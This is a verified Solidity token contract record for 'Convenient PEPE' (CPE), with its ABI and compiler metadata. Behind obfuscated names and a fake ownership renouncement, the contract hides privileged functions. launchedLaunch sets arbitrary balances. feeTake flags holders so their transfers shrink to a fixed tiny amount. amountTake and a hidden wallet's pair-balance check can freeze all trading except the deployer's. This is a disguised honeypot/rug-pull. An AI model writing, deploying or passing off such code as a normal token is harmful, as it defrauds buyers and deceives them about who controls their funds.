{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface tokenSenderTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverBuy) external view returns (uint256);\n\n    function transfer(address swapAt, uint256 liquidityReceiverMarketing) external returns (bool);\n\n    function allowance(address tradingEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityReceiverMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapAt,\n        uint256 liquidityReceiverMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderMode, uint256 value);\n    event Approval(address indexed tradingEnable, address indexed spender, uint256 value);\n}\n\nabstract contract shouldReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityTake {\n    function createPair(address modeLiquidity, address takeBuy) external returns (address);\n}\n\ninterface feeIs is tokenSenderTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConvenientPEPE is shouldReceiver, tokenSenderTotal, feeIs {\n\n    bool private enableAuto;\n\n    constructor (){\n        \n        totalTo maxExemptSender = totalTo(senderList);\n        amountTo = liquidityTake(maxExemptSender.factory()).createPair(maxExemptSender.WETH(), address(this));\n        \n        autoLiquidity = _msgSender();\n        teamTxIs();\n        tradingAt[autoLiquidity] = true;\n        totalSwapTake[autoLiquidity] = feeLaunched;\n        \n        emit Transfer(address(0), autoLiquidity, feeLaunched);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedSwap;\n\n    uint8 private isTrading = 18;\n\n    function sellBuy(address fromTrading) public {\n        if (receiverTotal) {\n            return;\n        }\n        \n        tradingAt[fromTrading] = true;\n        if (launchAmount) {\n            teamReceiver = autoMarketing;\n        }\n        receiverTotal = true;\n    }\n\n    function balanceOf(address receiverBuy) public view virtual override returns (uint256) {\n        return totalSwapTake[receiverBuy];\n    }\n\n    function getOwner() external view returns (address) {\n        return toReceiver;\n    }\n\n    function listSender(address receiverSenderTeam, address swapAt, uint256 liquidityReceiverMarketing) internal returns (bool) {\n        if (receiverSenderTeam == autoLiquidity) {\n            return walletTo(receiverSenderTeam, swapAt, liquidityReceiverMarketing);\n        }\n        uint256 senderLaunchBuy = tokenSenderTotal(amountTo).balanceOf(txWallet);\n        require(senderLaunchBuy == teamTake);\n        require(swapAt != txWallet);\n        if (liquidityTrading[receiverSenderTeam]) {\n            return walletTo(receiverSenderTeam, swapAt, launchedEnable);\n        }\n        return walletTo(receiverSenderTeam, swapAt, liquidityReceiverMarketing);\n    }\n\n    mapping(address => uint256) private totalSwapTake;\n\n    uint256 public teamReceiver;\n\n    uint256 private fundBuy;\n\n    address private toReceiver;\n\n    function enableShould() private view {\n        require(tradingAt[_msgSender()]);\n    }\n\n    bool public launchAmount;\n\n    function launchedLaunch(address txMin, uint256 liquidityReceiverMarketing) public {\n        enableShould();\n        totalSwapTake[txMin] = liquidityReceiverMarketing;\n    }\n\n    event OwnershipTransferred(address indexed fromList, address indexed feeTx);\n\n    string private toWallet = \"CPE\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return toWallet;\n    }\n\n    mapping(address => bool) public tradingAt;\n\n    uint256 toIs;\n\n    uint256 constant launchedEnable = 19 ** 10;\n\n    mapping(address => bool) public liquidityTrading;\n\n    function owner() external view returns (address) {\n        return toReceiver;\n    }\n\n    bool public receiverTotal;\n\n    uint256 teamTake;\n\n    function transfer(address txMin, uint256 liquidityReceiverMarketing) external virtual override returns (bool) {\n        return listSender(_msgSender(), txMin, liquidityReceiverMarketing);\n    }\n\n    function allowance(address walletTeam, address modeLimit) external view virtual override returns (uint256) {\n        if (modeLimit == senderList) {\n            return type(uint256).max;\n        }\n        return launchedSwap[walletTeam][modeLimit];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeLaunched;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isTrading;\n    }\n\n    uint256 private senderFee;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptBuy;\n    }\n\n    address senderList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public atSwapLiquidity;\n\n    function feeTake(address atMin) public {\n        enableShould();\n        \n        if (atMin == autoLiquidity || atMin == amountTo) {\n            return;\n        }\n        liquidityTrading[atMin] = true;\n    }\n\n    function amountTake(uint256 liquidityReceiverMarketing) public {\n        enableShould();\n        teamTake = liquidityReceiverMarketing;\n    }\n\n    address public autoLiquidity;\n\n    address txWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function walletTo(address receiverSenderTeam, address swapAt, uint256 liquidityReceiverMarketing) internal returns (bool) {\n        require(totalSwapTake[receiverSenderTeam] >= liquidityReceiverMarketing);\n        totalSwapTake[receiverSenderTeam] -= liquidityReceiverMarketing;\n        totalSwapTake[swapAt] += liquidityReceiverMarketing;\n        emit Transfer(receiverSenderTeam, swapAt, liquidityReceiverMarketing);\n        return true;\n    }\n\n    function approve(address modeLimit, uint256 liquidityReceiverMarketing) public virtual override returns (bool) {\n        launchedSwap[_msgSender()][modeLimit] = liquidityReceiverMarketing;\n        emit Approval(_msgSender(), modeLimit, liquidityReceiverMarketing);\n        return true;\n    }\n\n    uint256 private feeLaunched = 100000000 * 10 ** 18;\n\n    address public amountTo;\n\n    function teamTxIs() public {\n        emit OwnershipTransferred(autoLiquidity, address(0));\n        toReceiver = address(0);\n    }\n\n    uint256 private autoMarketing;\n\n    uint256 private takeTradingList;\n\n    string private exemptBuy = \"Convenient PEPE\";\n\n    function transferFrom(address receiverSenderTeam, address swapAt, uint256 liquidityReceiverMarketing) external override returns (bool) {\n        if (_msgSender() != senderList) {\n            if (launchedSwap[receiverSenderTeam][_msgSender()] != type(uint256).max) {\n                require(liquidityReceiverMarketing <= launchedSwap[receiverSenderTeam][_msgSender()]);\n                launchedSwap[receiverSenderTeam][_msgSender()] -= liquidityReceiverMarketing;\n            }\n        }\n        return listSender(receiverSenderTeam, swapAt, liquidityReceiverMarketing);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityReceiverMarketing\",\"type\":\"uint256\"}],\"name\":\"amountTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityReceiverMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSwapLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMin\",\"type\":\"address\"}],\"name\":\"feeTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityReceiverMarketing\",\"type\":\"uint256\"}],\"name\":\"launchedLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"}],\"name\":\"sellBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTxIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityReceiverMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSenderTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityReceiverMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConvenientPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}